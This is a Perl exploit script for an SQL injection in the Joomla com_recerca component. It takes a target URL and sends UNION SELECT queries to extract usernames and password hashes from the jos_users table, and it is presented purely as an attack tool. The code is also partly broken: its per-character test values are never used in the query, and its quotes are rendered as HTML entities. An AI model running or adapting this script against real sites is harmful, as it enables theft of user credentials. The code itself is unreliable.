Joomla Recerca component SQL Injection
======================================

use HTTP::Request;
use LWP::UserAgent;
 
$cmsapp = &#039;Joomla Component com_recerca&#039;;
$vuln   = &#039;index.php?option=com_recerca&task=linia&ansubdepartments_id=&#039;;
$column = &#039;concat(username,0x3a,password)tukulesto&#039;;
$table  = &#039;jos_users&#039;;
$regexp = &#039;No elements defined&#039;;
$maxlen = 65;
 
my $OS = "$^O";
if ($OS eq &#039;MSWin32&#039;) { system("cls"); } else { system("clear"); }
 
printf "\n
                $cmsapp
 [x]====================================================[x]
  |           www[dot]IndonesianCoder[dot]com            |
 [x]====================================================[x]
 
\n";
 
print " [~] URL Path : "; chomp($web=<STDIN>);
print " [~] Valid ID : "; chomp($id=<STDIN>);
print " [~] Column   : "; chomp($columns=<STDIN>);
 
if ($web =~ /http:\/\// ) { $target = $web."/"; } else { $target = "http://".$web."/"; }
 
print "\n\n [!] Exploiting $target ...\n\n";
&get_data;
print "\n\n [!] Exploit completed.\n\n";
 
sub get_data() {
    @columns = split(/,/, $columns);
    foreach $column (@columns) {
        print " [exploiting\@$web] SELECT $column FROM $table please wait...\n";
        syswrite(STDOUT, " [exploiting\@$web] $column\@$table > ", 255);
        for (my $i=1; $i<=$maxlen; $i++) {
            my $chr = 0;
            my $found = 1;
            my $char = 48;
            while (!$chr && $char<=90) {
                if(exploit($i,$char) !~ /$regexp/) {
                    $chr = 1;
                    $found = 1;
                    syswrite(STDOUT,chr($char),1);
                } else { $found = 0; }
                $char++;
            }
            if(!$chr) {
                $char = 97;
                while(!$chr && $char<=122) {
                    if(exploit($i,$char) !~ /$regexp/) {
                        $chr = 1;
                        $found = 1;
                        syswrite(STDOUT,chr($char),1);
                    } else { $found = 0; }
                    $char++;
                }
            }
            if (!$found) {
                print "\n"; last;
            }
        }
    }
}
 
sub exploit() {
    my $limit = $_[0];
    my $chars = $_[1];
    my $shits = &#039;+union+select+1,2,3,&#039;.$column.&#039;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+&#039;.$table.&#039;--&#039;;
    my $inject = $target.$vuln.$id.$shits;
    my $content = get_content($inject);
    return $content;
}
 
sub get_content() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $res = $ua->request($req);
    if ($res->is_error){
        print "\n\n [!] Error, ".$res->status_line.".\n\n";
        exit;
    }
    return $res->content;
}



